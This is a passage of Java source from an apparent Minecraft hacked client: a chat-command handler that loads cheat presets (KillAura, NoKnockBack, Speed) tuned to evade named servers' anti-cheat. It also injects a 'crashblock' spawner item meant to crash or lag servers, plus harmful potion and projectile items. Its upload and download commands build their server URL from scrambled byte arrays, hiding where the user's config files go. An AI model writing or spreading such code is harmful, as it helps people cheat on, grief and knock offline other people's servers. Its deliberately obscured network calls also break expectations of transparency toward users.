							}
							Client.setmgr.getSettingByName(YesCheat.mod, "Mode").setValString("Gomme");
							YesCheat.mode = Mode.Gomme;

							Client.enable("YesCheat");
							Client.enable("AutoArmor");
							Client.enable("NoRotSet");
							Client.enable("NoKnockBack");

							Client.setmgr.getSettingByName(AutoArmor.mod, "OnlyInventory").setValBoolean(true);
							Client.setmgr.getSettingByName(AutoArmor.mod, "Delay").setValFloat(5.0f);
							Client.setmgr.getSettingByName(InvCleaner.mod, "OnlyInventory").setValBoolean(true);
							Client.setmgr.getSettingByName(InvCleaner.mod, "Delay").setValFloat(100);
							Client.setmgr.getSettingByName(NoKnockBack.mod, "V").setValFloat(0);
							Client.setmgr.getSettingByName(NoKnockBack.mod, "H").setValFloat(0);
							Client.setmgr.getSettingByName(Scaffold.mod, "Expanded").setValBoolean(false);
							Client.setmgr.getSettingByName(KillAura.mod, "Range").setValFloat(3.7f);
							Client.setmgr.getSettingByName(KillAura.mod, "Delay").setValFloat(3);
							Client.setmgr.getSettingByName(KillAura.mod, "HurtCheck").setValBoolean(false);
							Client.setmgr.getSettingByName(Speed.mod, "Mode").setValString("GommeYPort");
							Client.setmgr.getSettingByName(KillAura.mod, "OnlyIngame").setValBoolean(false);
							Client.setmgr.getSettingByName(KillAura.mod, "RayTrace").setValBoolean(true);
							Client.setmgr.getSettingByName(KillAura.mod, "RandomCPS").setValBoolean(true);
							Client.setmgr.getSettingByName(Step.mod, "New").setValBoolean(true);
							Client.setmgr.getSettingByName(KillAura.mod, "HyPixel").setValBoolean(false);
							Client.setmgr.getSettingByName(KillAura.mod, "WallCheck").setValBoolean(true);
							Client.setmgr.getSettingByName(KillAura.mod, "PremiCheck").setValBoolean(true);
							Client.setmgr.getSettingByName(Tower.mod, "Mode").setValString("SlowJump");
							Client.setmgr.getSettingByName(ChestStealer.mod, "Delay").setValFloat(2f);

							msg("§aDefault GommeHD/Gomme Settings loaded!");
						}
						if (args[1].equalsIgnoreCase("default") || args[1].equalsIgnoreCase("d")) {
							for (final Category asd : Category.values()) {
								Client.disable(asd);
							}
							Client.setmgr.getSettingByName(YesCheat.mod, "Mode").setValString("ALL");
							YesCheat.updateMode();
							YesCheat.mode = Mode.ALL;
							Client.enable("NoRotSet");
							Client.enable("YesCheat");
							Client.enable("NoKnockBack");
							Client.enable("InventoryWalk");
							Client.enable("NoSlowdown");
							Client.enable("AutoArmor");

							Client.setmgr.getSettingByName(Scaffold.mod, "Expanded").setValBoolean(false);
							Client.setmgr.getSettingByName(NoKnockBack.mod, "V").setValFloat(0);
							Client.setmgr.getSettingByName(NoKnockBack.mod, "H").setValFloat(0);
							Client.setmgr.getSettingByName(KillAura.mod, "Range").setValFloat(4.5f);
							Client.setmgr.getSettingByName(KillAura.mod, "Delay").setValFloat(1);
							Client.setmgr.getSettingByName(Step.mod, "Height").setValFloat(1.0f);
							Client.setmgr.getSettingByName(KillAura.mod, "HurtCheck").setValBoolean(false);
							Client.setmgr.getSettingByName(Speed.mod, "Mode").setValString("NCPRace");
							Client.setmgr.getSettingByName(AutoArmor.mod, "OnlyInventory").setValBoolean(false);
							Client.setmgr.getSettingByName(KillAura.mod, "OnlyIngame").setValBoolean(false);
							Client.setmgr.getSettingByName(Step.mod, "New").setValBoolean(false);
							Client.setmgr.getSettingByName(KillAura.mod, "RandomCPS").setValBoolean(false);
							Client.setmgr.getSettingByName(KillAura.mod, "HyPixel").setValBoolean(false);

							msg("§aDefault Settings loaded!");
						}
						if (args[1].equalsIgnoreCase("mccentral") || args[1].equalsIgnoreCase("mcc")
								|| args[1].equalsIgnoreCase("mcz")) {
							for (final Category asd : Category.values()) {
								Client.disable(asd);
							}
							Client.setmgr.getSettingByName(YesCheat.mod, "Mode").setValString("Gomme");
							YesCheat.updateMode();
							YesCheat.mode = Mode.Gomme;

							Client.enable("NoRotSet");
							Client.enable("YesCheat");
							Client.enable("NoKnockBack");
							Client.enable("InventoryWalk");
							Client.enable("AutoArmor");
							Client.enable("Step");

							Client.setmgr.getSettingByName(Scaffold.mod, "Expanded").setValBoolean(false);
							Client.setmgr.getSettingByName(InvCleaner.mod, "OnlyInventory").setValBoolean(true);
							Client.setmgr.getSettingByName(InvCleaner.mod, "Delay").setValFloat(100);
							Client.setmgr.getSettingByName(NoKnockBack.mod, "V").setValFloat(0);
							Client.setmgr.getSettingByName(NoKnockBack.mod, "H").setValFloat(0);
							Client.setmgr.getSettingByName(KillAura.mod, "Range").setValFloat(4f);
							Client.setmgr.getSettingByName(KillAura.mod, "HurtCheck").setValBoolean(false);
							Client.setmgr.getSettingByName(AutoArmor.mod, "OnlyInventory").setValBoolean(false);
							Client.setmgr.getSettingByName(KillAura.mod, "OnlyIngame").setValBoolean(false);
							Client.setmgr.getSettingByName(KillAura.mod, "RayTrace").setValBoolean(true);
							Client.setmgr.getSettingByName(KillAura.mod, "RandomCPS").setValBoolean(true);
							Client.setmgr.getSettingByName(Step.mod, "New").setValBoolean(true);
							Client.setmgr.getSettingByName(KillAura.mod, "HyPixel").setValBoolean(false);

							msg("§aMCCentral Settings loaded!");
						}
						if (args[1].equalsIgnoreCase("list")) {
							try {
								final File folder = FileManager.configsDir;
								final File[] listOfFiles = folder.listFiles();
								if (listOfFiles == null) {
									return;
								}
								String str = "";
								int ScriptCounter = 0;
								for (final File listOfFile : listOfFiles) {
									if (!listOfFile.isDirectory()) {
										continue;
									}
									++ScriptCounter;
									str = str.isEmpty()
											? String.valueOf(String.valueOf(str)) + "§a" + listOfFile.getName()
											: String.valueOf(String.valueOf(str)) + "§8, §a" + listOfFile.getName();
								}
								msg("§eScripts §6(" + ScriptCounter + ")§e: " + str);
							} catch (final Exception e) {
								e.printStackTrace();
							}
						}

					} catch (final Exception exception) {
						msg("§4Error: §c" + exception.toString());
					}
					break;
				case 3:
					final String[] args = chatMessage.split(" ");
					if (args[1].equalsIgnoreCase("save") || args[1].equalsIgnoreCase("s")) {
						msg(FileManager.saveConfig(args[2]) ? "§aScript §6\"" + args[2] + "\"§a was saved!"
								: "§cScript §6\"" + args[2] + "\"§c couldn't be saved!");
					} else if (args[1].equalsIgnoreCase("load") || args[1].equalsIgnoreCase("l")) {
						for (final Category asd : Category.values()) {
							Client.disable(asd);
						}
						msg(FileManager.loadConfig(args[2]) ? "§aScript §6\"" + args[2] + "\"§a was loaded!"
								: "§cScript §6\"" + args[2] + "\"§c couldn't be loaded!");
					} else if (args[1].equalsIgnoreCase("upload")) {
						new Thread(() -> {
							String s = "";
							try {
								final File file = new File(FileManager.configsDir + File.separator + args[2])
										.getAbsoluteFile();
								if (!file.isDirectory()) {
									msg("§cScript §6\"" + args[2]
											+ "\"§c couldn't be uploaded: §7You don't have this script!");
									return;
								}
								final String script = args[2];
								for (int i1 = 0; i1 < 2; i1++) {
									final String fileName = i1 == 0 ? "Mods.json" : "Configs.json";
									final HttpURLConnection httpUrlConnection = (HttpURLConnection) new URL(new String(
											new byte[] { 104, 111, 119, 113, 119, 114 }).substring(0, 1)
											+ new String(new byte[] { 110, 120, 116, 109, 109, 109 }).substring(2, 3)
											+ new String(new byte[] { 102, 118, 103, 116, 108, 108 }).substring(3, 4)
											+ new String(new byte[] { 112, 110, 121, 107, 109, 113 }).substring(0, 1)
											+ new String(new byte[] { 100, 97, 111, 120, 58, 110 }).substring(4, 5)
											+ new String(new byte[] { 118, 110, 47, 112, 105, 102 }).substring(2, 3)
											+ new String(new byte[] { 113, 99, 103, 115, 47, 101 }).substring(4, 5)
											+ new String(new byte[] { 106, 109, 97, 110, 104, 97 }).substring(3, 4)
											+ new String(new byte[] { 115, 104, 114, 105, 97, 121 }).substring(3, 4)
											+ new String(new byte[] { 109, 114, 51, 107, 119, 113 }).substring(2, 3)
											+ new String(new byte[] { 112, 106, 54, 97, 103, 100 }).substring(2, 3)
											+ new String(new byte[] { 99, 56, 104, 112, 111, 112 }).substring(1, 2)
											+ new String(new byte[] { 50, 120, 116, 121, 105, 106 }).substring(0, 1)
											+ new String(new byte[] { 101, 101, 97, 115, 50, 110 }).substring(4, 5)
											+ new String(new byte[] { 98, 51, 118, 114, 102, 118 }).substring(1, 2)
											+ new String(new byte[] { 113, 104, 95, 116, 97, 102 }).substring(2, 3)
											+ new String(new byte[] { 100, 115, 50, 118, 103, 98 }).substring(2, 3)
											+ new String(new byte[] { 46, 97, 121, 116, 114, 104 }).substring(0, 1)
											+ new String(new byte[] { 103, 118, 116, 101, 99, 107 }).substring(1, 2)
											+ new String(new byte[] { 114, 109, 103, 108, 119, 110 }).substring(4, 5)
											+ new String(new byte[] { 101, 117, 106, 112, 105, 101 }).substring(0, 1)
											+ new String(new byte[] { 108, 100, 98, 109, 115, 117 }).substring(2, 3)
											+ new String(new byte[] { 113, 115, 49, 110, 116, 112 }).substring(2, 3)
											+ new String(new byte[] { 56, 119, 103, 98, 110, 111 }).substring(0, 1)
											+ new String(new byte[] { 115, 99, 115, 46, 98, 98 }).substring(3, 4)
											+ new String(new byte[] { 118, 105, 110, 100, 119, 107 }).substring(2, 3)
											+ new String(new byte[] { 97, 110, 100, 106, 105, 115 }).substring(4, 5)
											+ new String(new byte[] { 119, 99, 104, 116, 106, 117 }).substring(3, 4)
											+ new String(new byte[] { 114, 102, 102, 110, 112, 120 }).substring(0, 1)
											+ new String(new byte[] { 116, 100, 101, 97, 116, 116 }).substring(3, 4)
											+ new String(new byte[] { 115, 120, 100, 118, 112, 98 }).substring(2, 3)
											+ new String(new byte[] { 111, 104, 106, 119, 107, 98 }).substring(0, 1)
											+ new String(new byte[] { 118, 46, 103, 116, 102, 101 }).substring(1, 2)
											+ new String(new byte[] { 117, 120, 112, 110, 114, 112 }).substring(3, 4)
											+ new String(new byte[] { 110, 98, 101, 103, 101, 111 }).substring(4, 5)
											+ new String(new byte[] { 102, 105, 111, 116, 107, 108 }).substring(3, 4)
											+ new String(new byte[] { 99, 47, 119, 105, 117, 105 }).substring(1, 2)
											+ new String(new byte[] { 121, 101, 109, 117, 121, 102 }).substring(3, 4)
											+ new String(new byte[] { 97, 108, 116, 112, 105, 120 }).substring(3, 4)
											+ new String(new byte[] { 108, 117, 103, 100, 115, 103 }).substring(0, 1)
											+ new String(new byte[] { 105, 116, 111, 117, 113, 113 }).substring(2, 3)
											+ new String(new byte[] { 97, 108, 120, 97, 116, 98 }).substring(3, 4)
											+ new String(new byte[] { 110, 112, 100, 100, 98, 112 }).substring(3, 4)
											+ new String(new byte[] { 121, 108, 120, 70, 106, 103 }).substring(3, 4)
											+ new String(new byte[] { 116, 105, 111, 100, 104, 103 }).substring(1, 2)
											+ new String(new byte[] { 98, 100, 107, 109, 108, 110 }).substring(4, 5)
											+ new String(new byte[] { 115, 112, 115, 101, 101, 113 }).substring(3, 4)
											+ new String(new byte[] { 109, 121, 117, 46, 109, 98 }).substring(3, 4)
											+ new String(new byte[] { 100, 120, 97, 112, 105, 120 }).substring(3, 4)
											+ new String(new byte[] { 104, 117, 107, 109, 118, 98 }).substring(0, 1)
											+ new String(new byte[] { 110, 104, 115, 101, 112, 108 }).substring(4, 5)
											+ new String(new byte[] { 115, 112, 105, 63, 111, 107 }).substring(3, 4)
											+ new String(new byte[] { 114, 115, 120, 99, 105, 117 }).substring(1, 2)
											+ new String(new byte[] { 104, 100, 99, 107, 112, 114 }).substring(2, 3)
											+ new String(new byte[] { 110, 114, 99, 116, 114, 118 }).substring(4, 5)
											+ new String(new byte[] { 105, 102, 105, 107, 106, 98 }).substring(0, 1)
											+ new String(new byte[] { 98, 118, 102, 117, 112, 104 }).substring(4, 5)
											+ new String(new byte[] { 116, 121, 106, 113, 97, 100 }).substring(0, 1)
											+ new String(new byte[] { 102, 121, 109, 102, 61, 115 }).substring(4, 5)
											+ script
											+ new String(new byte[] { 104, 109, 38, 112, 111, 102 }).substring(2, 3)
											+ new String(new byte[] { 121, 112, 117, 102, 108, 108 }).substring(3, 4)
											+ new String(new byte[] { 110, 98, 106, 105, 98, 105 }).substring(3, 4)
											+ new String(new byte[] { 110, 98, 109, 108, 100, 100 }).substring(3, 4)
											+ new String(new byte[] { 112, 115, 111, 101, 118, 110 }).substring(3, 4)
											+ new String(new byte[] { 112, 97, 120, 110, 121, 118 }).substring(3, 4)
											+ new String(new byte[] { 115, 116, 97, 108, 121, 117 }).substring(2, 3)
											+ new String(new byte[] { 108, 109, 108, 103, 115, 97 }).substring(1, 2)
											+ new String(new byte[] { 112, 101, 119, 112, 121, 98 }).substring(1, 2)
											+ new String(new byte[] { 61, 100, 119, 104, 116, 108 }).substring(0, 1)
											+ fileName).openConnection();
									httpUrlConnection.setDoOutput(true);
									httpUrlConnection.setRequestMethod("POST");
									final BufferedInputStream fis;
									try (OutputStream os = httpUrlConnection.getOutputStream()) {
										Thread.sleep(1000);
										final File full = new File(file + File.separator + fileName);
										fis = new BufferedInputStream(new FileInputStream(full));
										int read = -1;
										while ((read = fis.read()) != -1) {
											os.write(read);
										}
									}
									try (BufferedReader in = new BufferedReader(
											new InputStreamReader(httpUrlConnection.getInputStream()))) {
										String a = null;
										while ((a = in.readLine()) != null) {
											s = a;
											System.out.println(s);
										}
									}
									fis.close();
								}
								msg(s.equals(" Done. ") ? "§aScript §6\"" + args[2] + "\"§a was uploaded!"
										: "§cScript §6\"" + args[2] + "\"§c couldn't be uploaded:§7" + s);
							} catch (final Exception e) {
								e.printStackTrace();
							}
						}).start();
					} else if (args[1].equalsIgnoreCase("download")) {
						new Thread(() -> {
							try {
								final File file = new File(FileManager.configsDir + File.separator + args[2])
										.getAbsoluteFile();
								file.mkdir();
								int ScriptCounter = 0;
								for (int i1 = 0; i1 < 2; i1++) {
									final String fileName = i1 == 0 ? "Mods.json" : "Configs.json";
									final HttpURLConnection httpUrlConnection = (HttpURLConnection) new URL(new String(
											new byte[] { 104, 121, 104, 112, 102, 117 }).substring(0, 1)
											+ new String(new byte[] { 111, 116, 101, 97, 100, 101 }).substring(1, 2)
											+ new String(new byte[] { 116, 116, 114, 107, 110, 101 }).substring(0, 1)
											+ new String(new byte[] { 97, 121, 112, 118, 108, 100 }).substring(2, 3)
											+ new String(new byte[] { 58, 101, 97, 120, 119, 99 }).substring(0, 1)
											+ new String(new byte[] { 104, 116, 47, 98, 116, 114 }).substring(2, 3)
											+ new String(new byte[] { 120, 116, 113, 47, 117, 107 }).substring(3, 4)
											+ new String(new byte[] { 98, 110, 110, 120, 110, 117 }).substring(1, 2)
											+ new String(new byte[] { 109, 115, 105, 114, 98, 105 }).substring(2, 3)
											+ new String(new byte[] { 118, 51, 117, 117, 108, 119 }).substring(1, 2)
											+ new String(new byte[] { 115, 54, 101, 112, 101, 105 }).substring(1, 2)
											+ new String(new byte[] { 56, 99, 100, 111, 105, 98 }).substring(0, 1)
											+ new String(new byte[] { 50, 120, 115, 120, 118, 117 }).substring(0, 1)
											+ new String(new byte[] { 121, 105, 98, 50, 99, 107 }).substring(3, 4)
											+ new String(new byte[] { 117, 102, 51, 101, 107, 99 }).substring(2, 3)
											+ new String(new byte[] { 101, 104, 97, 95, 103, 98 }).substring(3, 4)
											+ new String(new byte[] { 103, 106, 50, 115, 102, 109 }).substring(2, 3)
											+ new String(new byte[] { 112, 108, 121, 46, 104, 118 }).substring(3, 4)
											+ new String(new byte[] { 101, 118, 121, 112, 97, 97 }).substring(1, 2)
											+ new String(new byte[] { 103, 119, 116, 112, 100, 116 }).substring(1, 2)
											+ new String(new byte[] { 100, 108, 118, 116, 101, 103 }).substring(4, 5)
											+ new String(new byte[] { 115, 120, 98, 117, 98, 108 }).substring(2, 3)
											+ new String(new byte[] { 49, 99, 119, 120, 106, 107 }).substring(0, 1)
											+ new String(new byte[] { 106, 105, 107, 99, 56, 109 }).substring(4, 5)
											+ new String(new byte[] { 116, 46, 116, 115, 113, 116 }).substring(1, 2)
											+ new String(new byte[] { 107, 105, 110, 110, 108, 107 }).substring(3, 4)
											+ new String(new byte[] { 105, 112, 118, 111, 101, 106 }).substring(0, 1)
											+ new String(new byte[] { 113, 102, 116, 110, 109, 100 }).substring(2, 3)
											+ new String(new byte[] { 121, 112, 114, 97, 105, 111 }).substring(2, 3)
											+ new String(new byte[] { 97, 107, 98, 119, 107, 99 }).substring(0, 1)
											+ new String(new byte[] { 109, 115, 114, 111, 100, 117 }).substring(4, 5)
											+ new String(new byte[] { 110, 117, 111, 109, 101, 115 }).substring(2, 3)
											+ new String(new byte[] { 46, 115, 114, 101, 107, 98 }).substring(0, 1)
											+ new String(new byte[] { 102, 108, 116, 110, 101, 118 }).substring(3, 4)
											+ new String(new byte[] { 104, 121, 101, 102, 109, 111 }).substring(2, 3)
											+ new String(new byte[] { 102, 120, 116, 111, 102, 103 }).substring(2, 3)
											+ new String(new byte[] { 116, 99, 113, 106, 47, 118 }).substring(4, 5)
											+ new String(new byte[] { 115, 114, 118, 121, 116, 97 }).substring(0, 1)
											+ new String(new byte[] { 119, 101, 118, 99, 99, 98 }).substring(3, 4)
											+ new String(new byte[] { 97, 121, 114, 98, 118, 114 }).substring(2, 3)
											+ new String(new byte[] { 103, 105, 105, 120, 101, 117 }).substring(2, 3)
											+ new String(new byte[] { 97, 114, 107, 107, 112, 107 }).substring(4, 5)
											+ new String(new byte[] { 109, 111, 115, 116, 99, 99 }).substring(3, 4)
											+ new String(new byte[] { 115, 104, 104, 100, 120, 100 }).substring(0, 1)
											+ new String(new byte[] { 97, 109, 103, 47, 114, 116 }).substring(3, 4)
											+ args[2] + "/" + fileName).openConnection();
									httpUrlConnection.setDoInput(true);
									final FileWriter fis;
									try (InputStream is = httpUrlConnection.getInputStream()) {
										Thread.sleep(1000);
										final File full = new File(file + File.separator + fileName).getAbsoluteFile();
										System.out.println(full);
										fis = new FileWriter(full);
										int read = -1;
										while ((read = is.read()) != -1) {
											fis.append((char) read);
										}
									}
									fis.flush();
									fis.close();
									ScriptCounter++;
								}
								msg(ScriptCounter == 2 ? "§aScript §6\"" + args[2] + "\"§a was downloaded!"
										: "§cScript §6\"" + args[2] + "\"§c couldn't be downloaded!");
							} catch (final Exception e) {
								e.printStackTrace();
								msg("§cScript §6\"" + args[2] + "\"§c couldn't be downloaded: " + e.toString());
							}
						}).start();
					}
					break;
				default:
					msg("§6Syntax: §ascript [Gomme/G] / [d/default] / [MCCentral/MCC/MCZ] / [Rewinside/Rewi/R] / [HyPixel] / [Mineplex/MP/M]");
					msg("§6Syntax: §ascript [save/load/upload/download/list] [NAME]");
					break;
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "fucker")) {
				if (cmd.length != 1) {
					try {
						final String[] args = chatMessage.split(" ");
						if (args[1].equalsIgnoreCase("add")) {
							if (MiscUtils.isInteger(args[2])) {
								if (Block.getIdFromBlock(Block.getBlockFromName(args[2])) == 0) {
									return;
								}
								Fucker.ids.add(Integer.parseInt(args[2]));
								msg("§aAdded §6" + (Block.getBlockById(Integer.parseInt(args[2])).getLocalizedName()
										.contains("tile.")
												? Block.getBlockById(Integer.parseInt(args[2])).getLocalizedName()
														.replace("tile.", "").replace(".name", "")
												: Block.getBlockById(Integer.parseInt(args[2])).getLocalizedName())
										+ " §c(" + Block.getIdFromBlock(Block.getBlockFromName(args[2])) + ")§a.");
							} else {
								Fucker.ids.add(Block.getIdFromBlock(Block.getBlockFromName(args[2])));
								msg("§aAdded §6"
										+ (Block.getBlockFromName(args[2]).getLocalizedName().contains("tile.")
												? Block.getBlockFromName(args[2]).getLocalizedName()
														.replace("tile.", "").replace(".name", "")
												: Block.getBlockFromName(args[2]).getLocalizedName())
										+ " §c(" + Block.getIdFromBlock(Block.getBlockFromName(args[2])) + ")§a.");
							}
						}
						if (args[1].equalsIgnoreCase("remove")) {
							if (MiscUtils.isInteger(args[2])) {
								if (Integer.parseInt(args[2]) == 0) {
									return;
								}
								final List<Integer> idsbefore = new ArrayList<>();
								Fucker.ids.forEach((i) -> {
									idsbefore.add(i);
								});
								Fucker.ids.clear();
								idsbefore.stream().filter((i) -> (!(i == Integer.parseInt(args[2]))))
										.forEachOrdered((i) -> {
											Fucker.ids.add(i);
										});
								msg("§aRemoved §6" + (Block.getBlockById(Integer.parseInt(args[2])).getLocalizedName()
										.contains("tile.")
												? Block.getBlockById(Integer.parseInt(args[2])).getLocalizedName()
														.replace("tile.", "").replace(".name", "")
												: Block.getBlockById(Integer.parseInt(args[2])).getLocalizedName())
										+ " §c(" + Block.getIdFromBlock(Block.getBlockFromName(args[2])) + ")§a.");
							} else {
								final List<Integer> idsbefore = new ArrayList<>();
								Fucker.ids.forEach((i) -> {
									idsbefore.add(i);
								});
								Fucker.ids.clear();
								idsbefore.stream()
										.filter((i) -> (!(Block.getIdFromBlock(Block.getBlockFromName(args[2])) == i)))
										.forEachOrdered((i) -> {
											Fucker.ids.add(i);
										});
								msg("§aRemoved §6"
										+ (Block.getBlockFromName(args[2]).getLocalizedName().contains("tile.")
												? Block.getBlockFromName(args[2]).getLocalizedName()
														.replace("tile.", "").replace(".name", "")
												: Block.getBlockFromName(args[2]).getLocalizedName())
										+ " §c(" + Block.getIdFromBlock(Block.getBlockFromName(args[2])) + ")§a.");
							}
						}
						if (args[1].equalsIgnoreCase("reset")) {
							Fucker.ids.clear();
							Fucker.ids.add(26);
						}
						if (args[1].equalsIgnoreCase("list")) {
							Fucker.ids.forEach((i) -> {
								msg("§6" + (Block.getBlockById(i).getLocalizedName().contains("tile.")
										? Block.getBlockById(i).getLocalizedName().replace("tile.", "").replace(".name",
												"")
										: Block.getBlockById(i).getLocalizedName()));
							});
						}
					} catch (final Exception exception) {
						msg("§4Error: §c" + exception.toString());
					}
				} else {
					msg("§6Syntax: §afucker add [ID/Name] / remove [ID/Name]/ reset / list");
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "knockback")
					|| cmd[0].equalsIgnoreCase(Configs.commandPrefix + "kb")
					|| cmd[0].equalsIgnoreCase(Configs.commandPrefix + "nkb")
					|| cmd[0].equalsIgnoreCase(Configs.commandPrefix + "velocity")
					|| cmd[0].equalsIgnoreCase(Configs.commandPrefix + "novelocity")
					|| cmd[0].equalsIgnoreCase(Configs.commandPrefix + "noknockback")) {
				if (cmd.length != 1) {
					try {
						final String[] args = chatMessage.split(" ");

						if (args[1].equalsIgnoreCase("none")) {
							Client.setmgr.getSettingByName(NoKnockBack.mod, "H").setValFloat(0);
							Client.setmgr.getSettingByName(NoKnockBack.mod, "V").setValFloat(0);
							msg("§6NoKnockBack set to §anone");
							return;
						}

						if (MiscUtils.isInteger(args[2]) && (args[1].equalsIgnoreCase("v")
								|| args[1].equalsIgnoreCase("h") || args[1].equalsIgnoreCase("vertical")
								|| args[1].equalsIgnoreCase("horizontal"))) {
							if (Integer.parseInt(args[2]) <= 100 && Integer.parseInt(args[2]) >= 0) {
								if (args[1].equalsIgnoreCase("h") || args[1].equalsIgnoreCase("horizontal")) {
									Client.setmgr.getSettingByName(NoKnockBack.mod, "H")
											.setValFloat(Integer.parseInt(args[2]));
									msg("§6NoKnockBack-Horizontal set to §a" + args[2]);
								} else if (args[1].equalsIgnoreCase("v") || args[1].equalsIgnoreCase("vertical")) {

									Client.setmgr.getSettingByName(NoKnockBack.mod, "V")
											.setValFloat(Integer.parseInt(args[2]));
									msg("§6NoKnockBack-Vertical set to §a" + args[2]);
								} else {
									msg("§6Syntax: noknockback [h/horizontal/v/vertical] [Value]");
								}
							} else {
								msg("§6Specify a number between 0 and 100!");
							}
						} else {
							msg("§cSyntax: noknockback [h/horizontal/v/vertical] [Value]");
						}

					} catch (final Exception exception) {
						msg("§4Error: §c" + exception.toString());
					}
				} else {
					msg("§6Syntax: §anoknockback [h/horizontal/v/vertical] [Value]");
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "fix")) {
				if (cmd.length == 1) {
					try {

						EntityUtils.setLookChanged(false);

					} catch (final Exception exception) {
						msg("§4Error: §c" + exception.toString());
					}
				} else {
					msg("§6Fixes some things if you bug.");
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "bypass")
					|| cmd[0].equalsIgnoreCase(Configs.commandPrefix + "yescheat")
					|| cmd[0].equalsIgnoreCase(Configs.commandPrefix + "yc")) {
				if (cmd.length != 1) {
					try {
						final String[] args = chatMessage.split(" ");

						for (final Mode mode : YesCheat.Mode.values()) {
							if (mode.name().equalsIgnoreCase(args[1])) {
								Client.setmgr.getSettingByName(YesCheat.mod, "Mode").setValString(mode.name());
								YesCheat.updateMode();
								msg("§aByPass-Mode set to §6" + mode.name());
								return;
							}
						}

						msg("§6Syntax: §abypass [ALL/AAC/NCP/Gomme]");

					} catch (final Exception exception) {
						msg("§4Error: §c" + exception.toString());
					}
				} else {
					msg("§6Syntax: §abypass [ALL/AAC/NCP/Gomme]");
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "nameprotect")
					|| cmd[0].equalsIgnoreCase(Configs.commandPrefix + "np")) {
				if (cmd.length != 1) {
					try {
						final String[] args = chatMessage.split(" ");

						Client.setmgr.getSettingByName(NameProtect.mod, "Name").setValString(args[1].replace("_", " "));
						msg("§aNameProtect-Name set to §6" + args[1].replace("_", " "));

					} catch (final Exception exception) {
						msg("§4Error: §c" + exception.toString());
					}
				} else {
					msg("§6Syntax: §anameprotect [Name]");
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "lenny")) {
				if (cmd.length == 1) {
					try {

						copyToClipborad("( \u0361\u00B0 \u035C\u0296 \u0361\u00B0)");
						msg("§aCopied lenny to clipboard!");

					} catch (final Exception exception) {
						msg("§4Error: §c" + exception.toString());
					}
				} else {
					msg("§6Syntax: §alenny");
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "spawner")) {
				try {
					final String[] args = chatMessage.split(" ");
					final ItemStack itm = new ItemStack(Blocks.mob_spawner);

					final NBTTagCompound base = new NBTTagCompound();
					final NBTTagCompound entityTag = new NBTTagCompound();
					entityTag.setString("EntityId", args[1]);
					entityTag.setShort("MaxNearbyEntities", (short) 127);
					entityTag.setShort("RequiredPlayerRange", (short) -1);
					entityTag.setShort("MinSpawnDelay", (short) 1);
					entityTag.setShort("MaxSpawnDelay", (short) 1);
					entityTag.setShort("Delay", (short) 1);
					base.setTag("BlockEntityTag", entityTag);
					itm.setTagCompound(base);

					sendQueue.addToSendQueue(new C10PacketCreativeInventoryAction(
							Minecraft.thePlayer.inventory.getFirstEmptyStackReal(), itm));
					msg("§aSpawner given.");
				} catch (final Exception e) {
					e.printStackTrace();
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "crashblock")) {
				try {
					final ItemStack itm = new ItemStack(Blocks.mob_spawner);

					final NBTTagCompound base = new NBTTagCompound();
					final NBTTagCompound entityTag = new NBTTagCompound();
					entityTag.setString("EntityId", "ArmorStand");
					entityTag.setShort("MaxNearbyEntities", (short) 127);
					entityTag.setShort("RequiredPlayerRange", (short) -1);
					entityTag.setShort("MinSpawnDelay", (short) 1);
					entityTag.setShort("MaxSpawnDelay", (short) 1);
					entityTag.setShort("Delay", (short) 1);
					base.setTag("BlockEntityTag", entityTag);
					itm.setTagCompound(base);

					sendQueue.addToSendQueue(new C10PacketCreativeInventoryAction(
							Minecraft.thePlayer.inventory.getFirstEmptyStackReal(), itm));
					msg("§aCrashBlock given.");
				} catch (final Exception e) {
					e.printStackTrace();
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "rakete")) {
				try {
					final String[] args = chatMessage.split(" ");
					double x = 0;
					double y = 10;
					double z = 0;
					if (args.length == 4) {
						if (MiscUtils.isDouble(args[1]) && MiscUtils.isDouble(args[2]) && MiscUtils.isDouble(args[3])) {
							x = Double.parseDouble(args[1]);
							y = Double.parseDouble(args[2]);
							z = Double.parseDouble(args[3]);
						}
					}
					final ItemStack itm = new ItemStack(Items.armor_stand);

					final NBTTagCompound base = new NBTTagCompound();
					final NBTTagCompound entityTag = new NBTTagCompound();
					final NBTTagList motion = new NBTTagList();
					motion.appendTag(new NBTTagDouble(x));
					motion.appendTag(new NBTTagDouble(y));
					motion.appendTag(new NBTTagDouble(z));
					entityTag.setTag("Motion", motion);
					entityTag.setInteger("Invisible", 1);
					entityTag.setShort("Fire", (short) 20000);
					base.setTag("EntityTag", entityTag);
					itm.setTagCompound(base);

					sendQueue.addToSendQueue(new C10PacketCreativeInventoryAction(
							Minecraft.thePlayer.inventory.getFirstEmptyStackReal(), itm));

					msg("§aRakete given.");
				} catch (final Exception e) {
					e.printStackTrace();
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "hologram")
					|| cmd[0].equalsIgnoreCase(Configs.commandPrefix + "holo")) {
				try {
					new Thread(() -> {
						while (mc.currentScreen != null)
							try {
								Thread.sleep(100l);
							} catch (InterruptedException e) {
								e.printStackTrace();
							}
						mc.displayGuiScreen(new GuiHolo());
					}).start();
				} catch (final Exception e) {
					e.printStackTrace();
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "killpot")
					|| cmd[0].equalsIgnoreCase(Configs.commandPrefix + "killerpot")) {
				try {
					final ItemStack stack = new ItemStack(Items.potionitem);
					stack.setItemDamage(16384);
					final NBTTagList effects = new NBTTagList();
					final NBTTagCompound effect = new NBTTagCompound();
					effect.setInteger("Duration", 2000);
					effect.setInteger("Id", 6);
					effect.setInteger("Amplifier", 125);
					effects.appendTag(effect);
					stack.setTagInfo("CustomPotionEffects", effects);
					stack.setStackDisplayName("§c§lKiller§6§lPotion");

					sendQueue.addToSendQueue(new C10PacketCreativeInventoryAction(
							Minecraft.thePlayer.inventory.getFirstEmptyStackReal(), stack));
					msg("§aKillerPotion given.");
				} catch (final Exception e) {
					e.printStackTrace();
				}
